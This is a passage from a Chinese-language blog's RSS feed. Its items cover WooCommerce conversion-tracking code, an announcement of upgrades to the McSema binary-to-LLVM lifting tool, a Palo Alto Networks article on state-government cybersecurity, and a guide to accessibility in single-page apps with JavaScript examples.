&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$order_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;absint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;get_query_var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;order-received&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;get_post_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$order_id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;shop_order&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$order&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wc_get_order&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$order_id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      gtag(&amp;#34;event&amp;#34;, &amp;#34;conversion&amp;#34;, {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;send_to&amp;#34;: &amp;#34;Tracking-code-here-XXXXXXXXXX&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;value&amp;#34;: &amp;lt;?php echo $order-&amp;gt;get_total(); ?&amp;gt;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;currency&amp;#34;: &amp;#34;&amp;lt;?php echo $order-&amp;gt;get_currency(); ?&amp;gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;transaction_id&amp;#34;: &amp;lt;?php echo $order_id; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      });
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;?php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    endif;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;add_action( &amp;#39;wp_head&amp;#39;, &amp;#39;custom_conversion_tracking&amp;#39; );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>McSema二进制转LLVM比特码工具重大升级</title>
        <link>http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</link>
        <pubDate>Fri, 01 Aug 2025 21:24:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</guid>
        <description>&lt;h1 id=&#34;mcsema二进制转llvm比特码工具重大升级&#34;&gt;McSema：二进制转LLVM比特码工具重大升级
&lt;/h1&gt;&lt;p&gt;我们的x86机器码转LLVM比特码工具McSema刚刚完成全面升级。上周举办的开发马拉松显著改善了McSema的易用性、文档质量和代码质量，现在使用McSema分析和逆向工程二进制文件比以往任何时候都更容易。&lt;/p&gt;
&lt;h2 id=&#34;发展阶段&#34;&gt;发展阶段
&lt;/h2&gt;&lt;p&gt;McSema已成为我们日常工作中不可或缺的工具，它能帮助我们发现并加固二进制程序的安全漏洞、独立验证供应商源代码，以及生成高代码覆盖率的应用测试。该工具不仅应用于学术研究，还参与DARPA项目。自2014年开源以来，我们（及其他贡献者）持续扩展其功能以分析日益复杂的程序。&lt;/p&gt;
&lt;h2 id=&#34;性能优化&#34;&gt;性能优化
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;构建速度&lt;/strong&gt;：通过清理死代码、移除冗余库及优化目录结构，构建系统更简洁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;比特码生成&lt;/strong&gt;：改进控制流图遍历算法，移除Boost依赖，简化比特码生成流程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;比特码质量&lt;/strong&gt;：取消函数入口/出口的寄存器上下文存储，改用原生位宽操作处理标志位，新增惰性生成比特码优化功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;现代化改造&#34;&gt;现代化改造
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;升级至标准版LLVM 3.8（原使用定制版LLVM 3.5）&lt;/li&gt;
&lt;li&gt;完全移除Boost依赖，改用C++11现代特性&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;功能简化&#34;&gt;功能简化
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;统一命令行接口：&lt;code&gt;mcsema-disass&lt;/code&gt;负责反汇编，&lt;code&gt;mcsema-lift&lt;/code&gt;执行比特码转换&lt;/li&gt;
&lt;li&gt;弃用定制反汇编器bin_descend，统一采用IDA Pro作为反汇编引擎&lt;/li&gt;
&lt;li&gt;重构代码结构，精简CMake构建脚本&lt;/li&gt;
&lt;li&gt;采用无外部依赖的集成测试框架&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;新增特性&#34;&gt;新增特性
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;支持更多指令集（提供指令添加指南）&lt;/li&gt;
&lt;li&gt;新增&lt;code&gt;--list-supported&lt;/code&gt;命令查看支持指令列表&lt;/li&gt;
&lt;li&gt;集成测试框架支持快速添加全面翻译测试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文档完善&#34;&gt;文档完善
&lt;/h2&gt;&lt;p&gt;全新文档详细说明安装流程、使用方法、测试方案、功能扩展和调试技巧，并包含常见错误解决方案，显著降低第三方开发者的参与门槛。&lt;/p&gt;
&lt;h2 id=&#34;运行时增强&#34;&gt;运行时增强
&lt;/h2&gt;&lt;p&gt;提升运行效率，大幅降低内存占用，改进与原生Windows/Linux代码的复杂交互能力，使转换后的比特码不仅能用于静态分析，还可重新编译为可执行程序。&lt;/p&gt;
&lt;h2 id=&#34;未来规划&#34;&gt;未来规划
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;扩展对复杂软件的支持&lt;/li&gt;
&lt;li&gt;计划采用Binary Ninja替代IDA Pro进行控制流恢复&lt;/li&gt;
&lt;li&gt;新增ARM架构二进制转LLVM比特码功能&lt;/li&gt;
&lt;li&gt;拓展移动应用和嵌入式固件分析场景&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们正在招募对McSema开发感兴趣的实习生。入门者可先尝试&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/mcsema/blob/master/docs/Converting.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Linux二进制转换教程&lt;/a&gt;，了解如何使libFuzzer等工具作用于二进制文件。如有创新构想，欢迎联系我们——若方案可行，我们将提供资金支持实现。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>州和地方政府网络安全现代化转型</title>
        <link>http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/</link>
        <pubDate>Fri, 01 Aug 2025 21:17:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/</guid>
        <description>&lt;h1 id=&#34;州和地方政府网络安全现代化转型&#34;&gt;州和地方政府网络安全现代化转型
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：Darren Estridge 和 Thomas MacLellan&lt;br&gt;
&lt;strong&gt;发布日期&lt;/strong&gt;：2025年7月8日&lt;/p&gt;
&lt;p&gt;州政府的网络安全领导者们深知，地方机构正日益成为网络攻击的主要目标。从破坏州卫生系统的勒索软件到针对政府员工的钓鱼攻击，威胁不断升级，造成的财务和运营影响也愈发严重。根据《2023年K-12教育系统六年回顾报告》，近80个学区（涉及2000多所学校）遭受勒索软件攻击，导致停课、教学中断及学生数据泄露。然而，许多州机构仍在过度采购功能重复且缺乏整合的网络安全工具，无法匹配攻击的速度和规模。&lt;/p&gt;
&lt;h2 id=&#34;防御现代化的新思路&#34;&gt;防御现代化的新思路
&lt;/h2&gt;&lt;p&gt;州IT领导者需要改变防御现代化的方法。与联邦层面类似，单纯增加工具数量并不等同于增强防护。零散的采购会耗尽有限资源、增加操作复杂性并延缓响应速度。出路在于通过战略性的公私合作实现效率提升、系统整合和更智能的投资，借助私营部门的创新能力强化政府防护体系。&lt;/p&gt;
&lt;h2 id=&#34;州it网络安全新战略&#34;&gt;州IT网络安全新战略
&lt;/h2&gt;&lt;p&gt;各州机构（无论是公共安全、医疗还是教育部门）的孤立系统会导致重复劳动、响应迟缓以及纳税人资金使用效率低下。州首席信息官（CIO）和安全官（CISO）正意识到必须摆脱这种碎片化模式。Palo Alto Networks通过将安全运营整合至统一的AI驱动平台来支持这一转型——该模式已在联邦机构和财富100强企业中得到验证。&lt;/p&gt;
&lt;p&gt;但任何机构都不应孤军奋战。与私营网络安全供应商的战略合作能带来州IT部门内部无法获取的专业知识和威胁情报。公私合作可实现可扩展、可持续的安全现代化，确保州机构在有效管理资源的同时应对威胁。&lt;/p&gt;
&lt;h2 id=&#34;成功现代化的关键考量&#34;&gt;成功现代化的关键考量
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;成本优化&lt;/strong&gt;：减少工具数量可降低许可、维护和培训成本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;简化运营&lt;/strong&gt;：统一安全平台减轻管理负担&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全利用AI&lt;/strong&gt;：跟踪监控每位员工的AI使用情况&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加速威胁响应&lt;/strong&gt;：AI驱动自动化提升检测与处置速度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;改进合规性&lt;/strong&gt;：集中化可视性实现持续监控以满足报告和合规要求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过与可信行业伙伴合作，各州可部署跨机构无缝协作的整体平台化解决方案，在降低复杂性的同时提升韧性。这种平台化战略能使州政府将预算从重复浪费转向主动防御。&lt;/p&gt;
&lt;h2 id=&#34;规模化ai驱动的防御体系&#34;&gt;规模化AI驱动的防御体系
&lt;/h2&gt;&lt;p&gt;该战略的核心是Precision AI®——每日可识别和分类900万次威胁的自动化防御引擎。面对人手不足或身兼多职的州IT团队，AI与自动化能显著改善平均检测时间（MTTD）和平均响应时间（MTTR）等关键指标。在Palo Alto Networks的安全运营中心（SOC），MTTR已缩短至检测后一分钟内，确保在威胁升级前快速精准响应。这些成果正是公共机构与私营创新紧密协作的体现。&lt;/p&gt;
&lt;h2 id=&#34;云迁移中的安全保障&#34;&gt;云迁移中的安全保障
&lt;/h2&gt;&lt;p&gt;随着各州将财务系统到应急服务全面转向&amp;quot;云优先&amp;quot;策略，网络安全必须同步演进。通过FedRAMP和GovRAMP High认证的Prisma® Cloud为多云和混合环境提供从开发到部署的端到端防护。云创新的速度使州机构难以独自确保安全，与可信供应商合作能在保证合规性和敏捷性的同时避免复杂性增加或出现可视性缺口。&lt;/p&gt;
&lt;h2 id=&#34;专为州it需求打造&#34;&gt;专为州IT需求打造
&lt;/h2&gt;&lt;p&gt;Palo Alto Networks的公共部门团队深入理解各州环境的特殊性——从治理约束、采购流程到多机构协作。我们提供定制化解决方案消除低效环节，在全州生态系统中降低风险并提升服务交付能力。团队通过案例研究和行业基准提供可量化的关键绩效指标（KPI），确保解决方案直接对接管理层优先级。&lt;/p&gt;
&lt;p&gt;通过采用统一的AI驱动方案并发挥公私合作优势，州政府能有效保护公民数据、优化成本，构建更具韧性的数字未来。&lt;/p&gt;
&lt;h2 id=&#34;美国制造为政府而生&#34;&gt;美国制造·为政府而生
&lt;/h2&gt;&lt;p&gt;总部位于加州的Palo Alto Networks拥有20年网络安全创新领导经验。我们在全美49个州拥有8,800多名员工，硬件防火墙全部在美国德克萨斯州主装配中心生产。每年投入超过18亿美元的研发资金，持续推动美国技术领导力发展。&lt;/p&gt;
&lt;p&gt;Palo Alto Networks已准备好帮助各州IT机构实现网络安全现代化，共同构建更安全、更智能的未来。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>单页应用(SPA)无障碍最佳实践指南</title>
        <link>http://localhost:1313/p/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8spa%E6%97%A0%E9%9A%9C%E7%A2%8D%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</link>
        <pubDate>Fri, 01 Aug 2025 21:10:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8spa%E6%97%A0%E9%9A%9C%E7%A2%8D%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;单页应用spa无障碍最佳实践&#34;&gt;单页应用(SPA)无障碍最佳实践
&lt;/h1&gt;&lt;p&gt;现代网络用户期望获得快速、流畅的交互体验。单页应用(SPA)通过无需重新加载页面即可实时更新内容的方式满足了这一需求。然而，这种动态特性也给依赖辅助技术的残障用户带来了特殊的可访问性挑战。&lt;/p&gt;
&lt;h2 id=&#34;spa工作原理&#34;&gt;SPA工作原理
&lt;/h2&gt;&lt;p&gt;传统网站如同图书馆系统，每次请求新页面都需要服务器处理。而SPA则像随身携带的魔法书车，初始加载后所有内容更新都在后台完成，提供无缝的浏览体验。&lt;/p&gt;
&lt;h2 id=&#34;spa的无障碍挑战&#34;&gt;SPA的无障碍挑战
&lt;/h2&gt;&lt;h3 id=&#34;1-动态内容更新&#34;&gt;1. 动态内容更新
&lt;/h3&gt;&lt;p&gt;SPA使用JavaScript框架实时更新页面部分内容，但不会自动通知屏幕阅读器。例如购物车商品数量变化时，若未正确实现ARIA实时区域属性，视障用户可能无法获知操作结果。&lt;/p&gt;
&lt;p&gt;代码示例展示了模态窗口的焦点管理问题：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;openModal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;myModal&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;display&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;closeModalButton&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;focus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;closeModal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;myModal&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;display&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;none&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 关闭模态窗后未恢复焦点会导致键盘用户迷失位置
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-浏览器历史管理&#34;&gt;2. 浏览器历史管理
&lt;/h3&gt;&lt;p&gt;SPA通常需要手动处理历史记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;changeView&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;itemId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;contentView&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;contentView&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`/api/content/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;itemId&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;contentView&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerHTML&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 必须手动更新历史记录
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nx&#34;&gt;history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pushState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;itemId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span 